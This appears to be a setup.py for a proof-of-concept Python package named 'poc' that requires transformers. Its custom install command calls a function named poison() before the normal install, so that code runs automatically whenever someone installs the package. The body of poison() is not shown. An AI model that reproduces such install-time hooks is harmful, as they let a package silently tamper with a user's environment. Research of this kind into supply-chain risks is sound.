from setuptools import setup, find_packages
from setuptools.command.install import install

import atexit
from poc.main import poison


class Installer(install):
    def run(self):
        poison()
        install.run(self)


setup(
    name="poc",
    version="0.1",
    packages=find_packages(),
    include_package_data=True,
    install_requires=['transformers'],
    cmdclass={'install': Installer}
)
